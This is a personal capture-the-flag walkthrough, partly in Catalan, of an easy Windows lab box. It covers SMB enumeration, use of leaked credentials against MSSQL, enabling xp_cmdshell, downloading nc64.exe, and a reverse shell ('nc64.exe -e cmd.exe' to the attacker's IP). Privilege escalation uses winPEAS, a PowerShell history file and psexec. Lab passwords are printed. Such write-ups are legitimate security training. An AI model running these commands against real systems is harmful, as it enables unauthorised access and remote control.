# Intro
| Dificulty | OS | Start Date | End Date | Help? |
|---|---|---|---|---|
| Very Easy | Windows | 26/05/2022 | 28/05/2022 | Yes |


# Thought process
1. Common enumeration
2. Check `smbclient`
3. Use `impacket`
4. Try to execute reverse shell and find the user flag.
5. Privilege Escalation to find root flag.


# smbclient
> Check Samba Server from Linux
```bash
$ smbclient -N -L @Target_IP
```
[-N]: Suppresess the normal password prompt from the client to the user
[-L]: List what services are aviable

There's a folder call it "backups" that probably has more information.

> Access Samba folder
```bash
$ smbclient -N \\\\@Target_IP\\folder_name
```

`get file_name` To download file to our local machine.
[//]: The file is located in the directory from which the connection was established.

In these file we can see that there's a usrname:password.

```
ARCHETYPE\ sql_svc
M3g4c0rp123
```


# impacket
Collection of Python classes for working with network protocols. 
Impacket  is focused on providing low-level programmatic access to the packets and for some protocols. 

Download [Link](https://github.com/SecureAuthCorp/impacket)

> Connect to MSSQL
```bash
~/HTB/impacket/examples
└─$ python3 mssqlclient.py username@Target_IP -windows-auth
```
[-windows-auth]: Use Windows Authentication (Default False)


# MSSQL Server
Exploration Journey Link:
[Link 1](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)
[Link 2](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

First check what role does the user has `SELECT is_srvrolemember('sysadmin');`
[//]: 1 = True

We can set up command execution because the user has admin privileges.

>  Set up System Command Execution
```sql 
SQL> EXEC sp_configure 'show advanced options', 1; — priv  
SQL> RECONFIGURE; — priv 
SQL> sp_configure;
SQL> EXEC sp_configure 'xp_cmdshell', 1; — priv  
SQL> RECONFIGURE; — priv
```
[//]: Found in Link 2
[- priv]: Administrator privileges need it.

Now the server permits system commands.

> Test System Commands Execution
```SQL
SQL> xp_cmdshell "whoami";
```


# Reverse Shell
Now, attempt to get stable reverse shell. 
Use `nc64.exe` to execute interactive `cmd.exe` process on our listening port.
Download [Link](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------)

> Simple HTTP server
```bash
$ sudo python3 -m http.server 80
```

> Netcat Listener
```bash
$ sudo nc -lvnp 443
```
[netcat]: Read and Write data in the network.
[-l]: Listen incoming connection
[-v]: Verbose output
[-n]: Do not do DNS
[-p]: Specifies source port nc should use

Check the actual server directory. If the user doesn't have permission, change it.

> Current Server Directory
```sql
SQL> xp_cmdshell "powershell -c pwd";
```

In the current directory sql_svc does not have permission to execute things. 

> Change to user directory and execute Reverse shell
```sql
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://IP/nc64.exe -outfile nc64.exe"
```

Verify if  the simple Python HTTP server recibed the request

> Execute Reverse Shell
```sql
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe @IP 443"
```

Now look back to the listener to confirme that reverse shell is working.

The user flag is in the user's Desktop.

---

# Privilege Escalation
## winPEAS
Is Windows Local Privilege Escalation Vector tool .
Download [Link](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

Transfer winPEAS to the target machine using Python HTTP server.

> Simple HTTP Server
```bash
$ sudo python3 -m http.server 80
```

On the Target Machine, execute wget in order to download the program from the Local Machine. Use powershell to do this process.
```bash
powershell
wget http://@IP/winPEASx64.exe -outfile winPEASx64.exe
```
[//]: User must have permission in that directory

> Exectue winPEAS
```bash
PS C:\Users\sql_svc\Downloads> .\winPEASx64.exe
```

Can observer that we have [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege), which is also vulnerable to [juicy potato exploit](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato). However, check the two existing files where credentials could be possible to be found.




---

# Privilegie Escalation

Utilitzarem l'eina WinPeas. Primer descarreguem en local i despres la solicitem desde la màquina. 
(Continuar fent escolta en el port 80 amb python)
[Link descarrega](https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe)

Executar escolta en port 80 desde l'ubicació on està el winPEAS. Fer `wget` de l'arxiu

```powershell
wget http://10.10.14.123/winPEASx64.exe -outfile winPEASx64.exe
```
[//]: S'ha d'estar en un directori on l'usuari tingui permissos.

Executem el binari utilitzant la reverse shell
```powershell
.\winPEASx64.exe
```

Podem observat que hi ha `SeImpersonatePrivilege` [Link](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) i aquest es vulnerable a "[juicy potato exploit](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato)". Però abans mirem si hi ha arxius que puguin contindre passwords.

Com que 'sql_svc' es un usuari normal, podem mirar el equivalent al '.bashrc' de powershell.
```powershell
cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
```

El fitxer conté la contrasenya de administrador.
administrator:MEGACORP_4dm1n!!

Ara podem executar `psexec.py` desde impacket per tenir una shell com Administrador.

```bash
$ python3 psexec.py administrator@Target_IP
```
![[Pasted image 20220528174919.png]]
La root flag es troba en el desktop de l'usuari










